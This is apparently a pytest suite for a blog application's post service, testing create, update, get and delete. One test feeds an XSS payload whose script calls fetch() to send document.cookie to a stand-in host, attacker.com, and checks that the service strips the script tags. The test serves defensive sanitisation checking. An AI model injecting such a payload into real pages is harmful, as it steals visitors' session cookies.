import pytest
from sqlalchemy.ext.asyncio import AsyncSession

from app.models.post import Post
from app.schemas.post import PostCreate, PostUpdate
from app.services.post import PostService


@pytest.mark.asyncio
class TestPostService:
    @pytest.mark.asyncio
    async def test_create_post(self, test_db: AsyncSession, test_category):
        service = PostService(Post)
        post_in = PostCreate(
            title="My First Post",
            content_html="<p>Hello</p>",
            category_id=test_category.id,
        )

        post = await service.create(test_db, post_in)

        assert post.title == "My First Post"
        assert post.content_html == "<p>Hello</p>"
        assert post.slug == "my-first-post"
        assert post.id is not None

    @pytest.mark.asyncio
    async def test_create_post_with_xss_attach(
        self, test_db: AsyncSession, test_category
    ):
        service = PostService(Post)
        post_in = PostCreate(
            title="My First Post",
            content_html="<p>Отличная статья! <script>fetch('https://attacker.com' + document.cookie);</script></p>",
            category_id=test_category.id,
        )

        post = await service.create(test_db, post_in)

        assert post.title == "My First Post"
        assert (
            post.content_html
            == "<p>Отличная статья! fetch('https://attacker.com' + document.cookie);</p>"
        )
        assert post.slug == "my-first-post-1"
        assert post.id is not None

    @pytest.mark.asyncio
    async def test_update_post(self, test_db: AsyncSession, test_post: Post):
        service = PostService(Post)
        update_data = PostUpdate(
            title="Обновление заголовка", content_html="<p>И тела</p>"
        )

        updated = await service.update(test_db, test_post, update_data)

        assert updated.title == "Обновление заголовка"
        assert updated.content_html == "<p>И тела</p>"

    @pytest.mark.asyncio
    async def test_get_post(self, test_db: AsyncSession, test_post: Post):
        service = PostService(Post)

        post = await service.get(test_db, test_post.id)

        assert post is not None
        assert post.id == test_post.id

    @pytest.mark.asyncio
    async def test_delete_post(self, test_db: AsyncSession, test_post: Post):
        service = PostService(Post)

        deleted = await service.remove(test_db, test_post.id)
        post_after = await service.get(test_db, test_post.id)

        assert deleted.id == test_post.id
        assert post_after is None
